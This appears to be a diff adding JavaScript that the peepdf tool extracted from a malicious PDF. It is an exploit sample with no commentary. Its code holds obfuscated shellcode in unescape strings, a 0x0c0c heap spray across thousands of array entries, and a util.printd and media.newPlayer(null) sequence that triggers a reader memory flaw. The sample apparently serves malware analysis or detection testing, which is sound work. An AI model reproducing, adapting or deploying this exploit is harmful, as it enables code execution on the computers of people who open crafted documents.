@@ -1,0 +1,22 @@
+// peepdf comment: Javascript code located in object 6 (version 0)
+
+var ILAciHNVC = unescape("%u5eba%ub01c%u3373%ub1c9%udb49%ud9dd%u2474%u5ef4%uee83%u31fc%u0c56%u5603%ubc0c%u4ce9%uc99b%uad12%ua95c%u489b%ufb6d%u19f8%ucbdc%u4c8b%ua0ed%u64de%uc466%u8bf6%u62cf%ua521%u43d0%u69ed%uc212%u7391%u2447%ubbab%u259a%ua6ec%u7755%uada5%u67c4%uf0c2%u86d4%u7f04%uf064%u4021%u4a11%u912b%uc18a%u0963%u8da0%u2853%uce65%u63a8%u2402%u725a%u75c2%u44a3%ud92a%u689a%u20a7%u4fda%u5758%uac10%u6fe5%ucee3%ufa31%u69f6%u5cb1%u88d3%u3a16%u8790%u49d3%u8bfe%u9ee2%ub774%u216f%u315b%u052b%u197f%u24ef%uc726%u595e%uaf38%uff3f%u4232%u792b%u0b19%ub798%ucba2%uc0b6%uf9d1%u7a19%ub27e%ua4d2%ub579%u10c8%u4815%u60f3%u8f3f%u30a7%u2657%udbc8%uc7a7%u4b1d%u67f8%u2bce%uc7a8%uc3be%uc7a2%uf3e1%u0dcc%u998a%uc637%u0abf%ufe4d%ub6a8%uefad%u3f74%u654b%u6995%u12c3%u300c%u839f%uefd1%u84e5%u035a%u4a19%u6eab%u3b09%u255b%uea73%u9064%u131e%u1ef1%u4489%u1c6d%ua3ec%udf32%ubfdb%u75fb%ud7a4%u9903%u2824%uf352%u4024%ua702%u7576%u724d%u26eb%u7cd8%u9a5a%u144b%uc560%ubbbc%u209b%u803d%u0d4d%uf0bb%u7dfb%u4107");
+var BEMCdqNPmLBiecAXeOrmqvosOGYjEDBBQTrFBVlYNzABMuIcTqoEzgaXnEhPZxfOkmrdjgfLXJfx = unescape("%u0c0c%u0c0c");
+var ifhKSNDWdmsv = unescape("%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u4778%u5441%u4648%u5775%u4f48%u566b%u4e70%u4c68%u526e%u494c%u4164%u4253%u5648%u545a%u6761%u7a45%u4e4e%u6556%u6c79%u6868%u7357%u6e4e%u7570%u7343%u644d%u7453%u6466%u4f4f");
+
+while (BEMCdqNPmLBiecAXeOrmqvosOGYjEDBBQTrFBVlYNzABMuIcTqoEzgaXnEhPZxfOkmrdjgfLXJfx.length <= 32768) BEMCdqNPmLBiecAXeOrmqvosOGYjEDBBQTrFBVlYNzABMuIcTqoEzgaXnEhPZxfOkmrdjgfLXJfx += BEMCdqNPmLBiecAXeOrmqvosOGYjEDBBQTrFBVlYNzABMuIcTqoEzgaXnEhPZxfOkmrdjgfLXJfx;
+BEMCdqNPmLBiecAXeOrmqvosOGYjEDBBQTrFBVlYNzABMuIcTqoEzgaXnEhPZxfOkmrdjgfLXJfx = BEMCdqNPmLBiecAXeOrmqvosOGYjEDBBQTrFBVlYNzABMuIcTqoEzgaXnEhPZxfOkmrdjgfLXJfx.substring(0, 32768 - ILAciHNVC.length);
+
+memory = new Array();
+
+for (i = 0; i < 0x2000; i++) {
+    memory[i] = BEMCdqNPmLBiecAXeOrmqvosOGYjEDBBQTrFBVlYNzABMuIcTqoEzgaXnEhPZxfOkmrdjgfLXJfx + ILAciHNVC;
+}
+
+util.printd("vLRagzDbNiATexRPtRjjJjlcBmiaMathbMNH", new Date());
+util.printd("zOhPAMHfOIpoTuIMzNMkMxkwBoGZAGdmyIdg", new Date());
+try {
+    this.media.newPlayer(null);
+} catch (e) {}
+util.printd(ifhKSNDWdmsv, new Date());
+
